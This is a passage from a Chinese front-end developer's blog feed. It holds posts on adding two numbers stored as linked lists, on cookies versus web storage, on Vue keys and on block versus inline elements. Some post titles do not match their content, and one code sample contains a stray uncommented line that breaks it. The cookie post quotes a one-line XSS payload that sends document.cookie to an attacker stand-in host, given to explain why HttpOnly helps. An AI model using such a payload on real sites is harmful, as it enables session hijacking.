class="hljs-number">0</span>;        <span class="hljs-keyword">let</span> num2 = <span class="hljs-number">0</span>;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 == <span class="hljs-literal">null</span></span>)</span>&#123;            num1 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num1 = l1.val;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 == <span class="hljs-literal">null</span></span>)</span>&#123;            num2 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num2 = l2.val;        &#125;        <span class="hljs-comment">// let num1 = l1 == null ? 0 : l1.val;</span>        <span class="hljs-comment">// let num2 = l2 == null ? 0 : l2.val;</span>        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l1 = l1.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l1 比 l2 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l1 = l1;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l2 = l2.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l2 = l2;        &#125;        <span class="hljs-comment">// l1 为不为 null 才满足条件</span>        <span class="hljs-comment">// l1 = l1 ? l1.next : l1;</span>        <span class="hljs-comment">// l2 = l2 ? l2.next : l2;</span>    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-代码缩减-1"><a href="#▉-代码缩减-1" class="headerlink" title="▉ 代码缩减:"></a>▉ 代码缩减:</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = l1 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l1.val;        <span class="hljs-keyword">let</span> num2 = l2 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l2.val;        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        l1 为不为 <span class="hljs-literal">null</span> 才满足条件        l1 = l1 ? l1.next : l1;        l2 = l2 ? l2.next : l2;    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-总结：需要注意几点。-1"><a href="#▉-总结：需要注意几点。-1" class="headerlink" title="▉ 总结：需要注意几点。"></a>▉ 总结：需要注意几点。</h6><blockquote><p>1、<code> l1 = l1 ? l1.next : l1</code> 代表的是 l1 不等于 null 会去 l1.next 的值。</p><p>2、用到哨兵思想，所以注意当前的指针指向。</p><p>3、两位数取模运算。</p></blockquote><h6 id="▉-扩展：-1"><a href="#▉-扩展：-1" class="headerlink" title="▉ 扩展："></a>▉ 扩展：</h6><blockquote><p>三位数怎么取得各个位置上的数字？（水仙花数）</p><p><strong>答：</strong></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//移动小数点向前一位，得到小数点后一位</span>个位：a = <span class="hljs-number">123</span> % <span class="hljs-number">10</span> = <span class="hljs-number">3</span><span class="hljs-comment">//移动小数点向前两位，得到小数点后两位，除以10取整</span>十位：b  = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">100</span>) / <span class="hljs-number">10</span>)<span class="hljs-comment">//移动小数点向前三位，得到小数点后三位，除以100取整</span>百位:：c = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">1000</span>) / <span class="hljs-number">100</span>)<span class="hljs-comment">//依次类推.....</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>剑指offer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>剑指offer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>块级元素与行内元素</title>
    <link href="/hexo_blog/2021/09/09/sessionStage%E5%92%8ClocalStage/"/>
    <url>/hexo_blog/2021/09/09/sessionStage%E5%92%8ClocalStage/</url>
    
    <content type="html"><![CDATA[<h1 id="cookie，sessionStorage-和-localStorage-的区别-cake"><a href="#cookie，sessionStorage-和-localStorage-的区别-cake" class="headerlink" title="cookie，sessionStorage 和 localStorage 的区别 :cake:"></a>cookie，sessionStorage 和 localStorage 的区别 :cake:</h1><h2 id="前言-pencil"><a href="#前言-pencil" class="headerlink" title="前言:pencil:"></a>前言:pencil:</h2><p>:label: cookie，localStorage，sessionStorage都是在客户端保存数据的，存储数据的类型：都是字符串。</p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><ul><li><p><code>cookie</code>是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）</p></li><li><p>cookie数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递</p><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 读取所有可从此位置访问的CookieallCookies = document.cookie;<span class="hljs-regexp">//</span> 写一个新 cookiedocument.cookie = newCookie;<span class="hljs-regexp">//</span> 每条cookie以<span class="hljs-string">&quot;分号和空格(; )&quot;</span>分隔(即, key=value 键值对)。document.cookie = <span class="hljs-string">&quot;name=oeschger&quot;</span>;document.cookie = <span class="hljs-string">&quot;favorite_food=tripe&quot;</span>;alert(document.cookie);<span class="hljs-regexp">//</span> 显示: name=oeschger;favorite_food=tripe</code></pre></div></li></ul><p>安全：(MDN)</p><p>路径限制并<strong>不能</strong>阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe">iframe</a>, 然后访问其 <code>contentDocument.cookie</code> 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">同源策略</a>保护其不被读取.</p><p>Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 -</p><div class="hljs code-wrapper"><pre><code class="hljs coffeescript">(<span class="hljs-keyword">new</span> Image()).src = <span class="hljs-string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="hljs-built_in">document</span>.cookie;</code></pre></div><p><code>HttpOnly</code> 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击. 参见 <a href="https://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Cookies and Security</a>.</p><p>​    </p><h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><p><code>localStorage</code> 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型</p><p>localStorage的生命周期是永久的，关闭页面或浏览器之后localStorage中的数据也不会消失。localStorage除非主动删除数据，否则数据永远不会消失。</p><h2 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h2><ul><li><p>页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。</p></li><li><p><strong>在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文，</strong>这点和 session cookies 的运行方式不同。</p></li><li><p>打开多个相同的URL的Tabs页面，会创建各自的<code>sessionStorage</code>。</p></li><li><p>关闭对应浏览器窗口（Window）/ tab，会清除对应的<code>sessionStorage</code>。 </p><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 保存数据到 sessionStoragesessionStorage.setItem(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<span class="hljs-regexp">//</span> 从 sessionStorage 获取数据let data = sessionStorage.getItem(<span class="hljs-string">&#x27;key&#x27;</span>);<span class="hljs-regexp">//</span> 从 sessionStorage 删除保存的数据sessionStorage.removeItem(<span class="hljs-string">&#x27;key&#x27;</span>);<span class="hljs-regexp">//</span> 从 sessionStorage 删除所有保存的数据sessionStorage.clear();</code></pre></div></li></ul><h2 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h2><ul><li><code>sessionStorage</code>和<code>localStorage</code>不会自动把数据发给服务器，仅在本地保存</li><li>存储大小：<ul><li><code>cookie</code>数据大小不能超过4k</li><li><code>sessionStorage</code>和<code>localStorage</code>虽然也有存储大小的限制，但比<code>cookie</code>大得多，可以达到5M或更大</li></ul></li><li>有期时间：<ul><li><code>localStorage</code> 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据</li><li><code>sessionStorage</code> 数据在当前浏览器窗口关闭后自动删除</li><li><code>cookie</code> 设置的<code>cookie</code>过期时间之前一直有效，即使窗口或浏览器关闭</li></ul></li></ul><h2 id="注意-circus-tent"><a href="#注意-circus-tent" class="headerlink" title="注意 :circus_tent:"></a>注意 :circus_tent:</h2><p><code>localStorage</code> 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型).</p>]]></content>
    
    
    <categories>
      
      <category>html</category>
      
    </categories>
    
    
    <tags>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vue中key的作用</title>
    <link href="/hexo_blog/2021/09/09/vue%E7%9A%84key/"/>
    <url>/hexo_blog/2021/09/09/vue%E7%9A%84key/</url>
    
    <content type="html"><![CDATA[<h1 id="vue中key的作用"><a href="#vue中key的作用" class="headerlink" title="vue中key的作用"></a>vue中key的作用</h1><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><div class="hljs code-wrapper"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;example-1&quot;</span>&gt;</span></span><span class="xml">  </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;item in items&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;item.message&quot;</span>&gt;</span></span><span class="xml">    </span><span class="xquery">&#123;&#123; <span class="hljs-type">item</span>.message &#125;</span><span class="xml">&#125;</span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>var example1 = new Vue(&#123;  el: <span class="hljs-string">&#x27;#example-1&#x27;</span>,  data: &#123;    items: [      &#123; message: <span class="hljs-string">&#x27;Foo&#x27;</span> &#125;,      &#123; message: <span class="hljs-string">&#x27;Bar&#x27;</span> &#125;    ]  &#125;&#125;)</code></pre></div><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>vue 中 key 值的作用可以分为两种情况来考虑。</p><p>第一种情况是 v-if 中使用 key。由于 Vue 会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染。因此当我们使用 v-if 来实现元素切换的时候，如果切换前后含有相同类型的元素，那么这个元素就会被复用。如果是相同的 input 元素，那么切换前后用户的输入不会被清除掉，这样是不符合需求的。因此我们可以通过使用 key 来唯一的标识一个元素，这个情况下，使用 key 的元素不会被复用。这个时候 key 的作用是用来标识一个独立的元素。</p><p>第二种情况是 v-for 中使用 key。用 v-for 更新已渲染过的元素列表时，它默认使用“就地复用”的策略。如果数据项的顺序发生了改变，Vue 不会移动 DOM 元素来匹配数据项的顺序，而是简单复用此处的每个元素。因此通过为每个列表项提供一个 key 值，来以便 Vue 跟踪元素的身份，从而高效的实现复用。这个时候 key 的作用是为了高效的更新渲染虚拟 DOM。</p><ul><li>key是为Vue中的vnode标记的唯一id,通过这个key,我们的diff操作可以更准确、更快速</li><li>diff算法的过程中,先会进行新旧节点的首尾交叉对比,当无法匹配的时候会用新节点的key与旧节点进行比对,然后超出差异.</li></ul><blockquote><p>diff程可以概括为：oldCh和newCh各有两个头尾的变量StartIdx和EndIdx，它们的2个变量相互比较，一共有4种比较方式。如果4种比较都没匹配，如果设置了key，就会用key进行比较，在比较的过程中，变量会往中间靠，一旦StartIdx&gt;EndIdx表明oldCh和newCh至少有一个已经遍历完了，就会结束比较,这四种比较方式就是首、尾、旧尾新头、旧头新尾.</p></blockquote><blockquote><p>准确: 如果不加key,那么vue会选择复用节点(Vue的就地更新策略),导致之前节点的状态被保留下来,会产生一系列的bug. 快速: key的唯一性可以被Map数据结构充分利用,相比于遍历查找的时间复杂度<code>O(n)</code>,<code>Map</code>的时间复杂度仅仅为<code>O(1)</code>.</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>key</code>的作用是尽可能的复用 DOM 元素。</p><p>新旧 children 中的节点只有顺序是不同的时候，最佳的操作应该是通过移动元素的位置来达到更新的目的。</p><p>需要在新旧 children 的节点中保存映射关系，以便能够在旧 children 的节点中找到可复用的节点。key也就是children中节点的唯一标识。</p><h2 id="面试-taco"><a href="#面试-taco" class="headerlink" title="面试 :taco:"></a>面试 :taco:</h2><h3 id="如果我将key设置为了一个Math-random-可以吗"><a href="#如果我将key设置为了一个Math-random-可以吗" class="headerlink" title="如果我将key设置为了一个Math.random()可以吗"></a>如果我将key设置为了一个Math.random()可以吗</h3><p><code>key</code>它就是为了保证我们的DOM节点能够复用，如果你都把它设置为了一个随机数的话，那每次重写渲染都会是另一个数了根本不可能达到复用的效果</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>块级元素与行内元素</title>
    <link href="/hexo_blog/2021/09/09/%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0%E3%80%81%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0/"/>
    <url>/hexo_blog/2021/09/09/%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0%E3%80%81%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="块级元素与行内元素🍔"><a href="#块级元素与行内元素🍔" class="headerlink" title="块级元素与行内元素🍔"></a>块级元素与行内元素🍔</h1><h2 id="前言®️"><a href="#前言®️" class="headerlink" title="前言®️"></a>前言®️</h2><h5 id="块级元素"><a href="#块级元素" class="headerlink" title="块级元素"></a>块级元素</h5><p>独占一行；元素的宽高、以及内外边距都可设置；元素宽度在不设置的情况下，是它本身父容器的100%。<br><code>常用</code>：div, h1~h6, p, form, ul, li, ol, dl, address, hr, menu, table, fieldset</p><h5 id="行内元素："><a href="#行内元素：" class="headerlink" title="行内元素："></a>行内元素：</h5><p>不会自动进行换行；元素的宽高不可设置；内边距可以设置、外边距水平方向有效，竖直方向无效；元素宽度在不设置的情况下，随内部元素的内容变化。<br><code>常用</code>：a, span, label, strong, em, br, img, input, select, textarea, cite,</p><h2 id="注意事项🔰"><a href="#注意事项🔰" class="headerlink" title="注意事项🔰"></a>注意事项🔰</h2><p>行内元素和块级元素都不是绝对的，可以相互转换</p><p>1、display，将元素设置为块级、行内或是其它。　　<br>2、float，隐形地把内联元素转换为行内块级元素。不会占据一行，相当于display：inline-block;　　<br>3、position,属性值为absolute、fixed 时,隐形地把内联元素转换为块级元素，其它属性值不会做转换。</p>]]></content>
    
    
    <categories>
      
      <category>html</category>
      
    </categories>
    
    
    <tags>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二维数组的查找 🤺</title>
    <link href="/hexo_blog/2021/09/05/%E5%89%91%E6%8C%87offer-1/"/>
    <url>/hexo_blog/2021/09/05/%E5%89%91%E6%8C%87offer-1/</url>
    
    <content type="html"><![CDATA[<h4 id="题目：-1-二维数组的查找"><a href="#题目：-1-二维数组的查找" class="headerlink" title="题目：(1)二维数组的查找"></a>题目：(1)二维数组的查找</h4><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><p><strong>例子:</strong></p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">(2</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">(5</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">6</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span><span class="hljs-string">)</span><span class="hljs-attr">Output:</span> <span class="hljs-number">7</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">0</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">8</span><span class="hljs-attr">Explanation:</span> <span class="hljs-number">342</span> <span class="hljs-string">+</span> <span class="hljs-number">465</span> <span class="hljs-string">=</span> <span class="hljs-number">807</span><span class="hljs-string">.</span></code></pre></div><p><strong>解决:</strong> </p><h6 id="▉-算法思路："><a href="#▉-算法思路：" class="headerlink" title="▉ 算法思路："></a>▉ 算法思路：</h6><blockquote><p>1）观察 Example 规律，关联到链表，用一个带头的链表存储。</p><p>2）多位数加多位数，反转链表转化整数，如果整数相加，可能会溢出，此方法行不通。</p><p>3）直接进行位数运算，两链表每取出一个就做运算，将结果放入到新链表中。</p></blockquote><h6 id="▉-临界条件："><a href="#▉-临界条件：" class="headerlink" title="▉ 临界条件："></a>▉ 临界条件：</h6><blockquote><p>1）一个链表比另一个链表长；</p><p>2）其中一个链表为 null。</p><p>3）求和运算会出现额外的进位（一般进位与最高位进位两种情况）。</p></blockquote><h6 id="▉-步骤："><a href="#▉-步骤：" class="headerlink" title="▉ 步骤："></a>▉ 步骤：</h6><blockquote><p>1）遍历链表之前，要定义一个哨兵结点、临时结点、存储计算结果的结点、进位标志；</p><p>2）开始遍历数据，判断当前结点是否为 null，为 null 就用 0 代替，否则取出数值；</p><p>3）求和（加 carray 进位），判断是否进位？记录进位值；</p><p>4）求模取余，计算两位数的各位数存储到链表中，指针向后移动；</p><p>5）判断结点是否为 null，继续遍历（如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理）</p><ol start="6"><li>退出 while 循环勿忘最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位，存放到链表最后</li></ol></blockquote><h6 id="▉-代码实现："><a href="#▉-代码实现：" class="headerlink" title="▉ 代码实现："></a>▉ 代码实现：</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 性能分析：</span><span class="hljs-comment"> * 1)遍历整个链表，时间复杂度为 O（n）。</span><span class="hljs-comment"> * 2)需要额外的 n 大小的空间存储 计算结果结点，空间复杂度为 O(n)。</span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = <span class="hljs-number">0</span>;        <span class="hljs-keyword">let</span> num2 = <span class="hljs-number">0</span>;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 == <span class="hljs-literal">null</span></span>)</span>&#123;            num1 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num1 = l1.val;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 == <span class="hljs-literal">null</span></span>)</span>&#123;            num2 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num2 = l2.val;        &#125;        <span class="hljs-comment">// let num1 = l1 == null ? 0 : l1.val;</span>        <span class="hljs-comment">// let num2 = l2 == null ? 0 : l2.val;</span>        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l1 = l1.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l1 比 l2 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l1 = l1;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l2 = l2.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l2 = l2;        &#125;        <span class="hljs-comment">// l1 为不为 null 才满足条件</span>        <span class="hljs-comment">// l1 = l1 ? l1.next : l1;</span>        <span class="hljs-comment">// l2 = l2 ? l2.next : l2;</span>    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-代码缩减"><a href="#▉-代码缩减" class="headerlink" title="▉ 代码缩减:"></a>▉ 代码缩减:</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = l1 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l1.val;        <span class="hljs-keyword">let</span> num2 = l2 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l2.val;        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        l1 为不为 <span class="hljs-literal">null</span> 才满足条件        l1 = l1 ? l1.next : l1;        l2 = l2 ? l2.next : l2;    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-总结：需要注意几点。"><a href="#▉-总结：需要注意几点。" class="headerlink" title="▉ 总结：需要注意几点。"></a>▉ 总结：需要注意几点。</h6><blockquote><p>1、<code> l1 = l1 ? l1.next : l1</code> 代表的是 l1 不等于 null 会去 l1.next 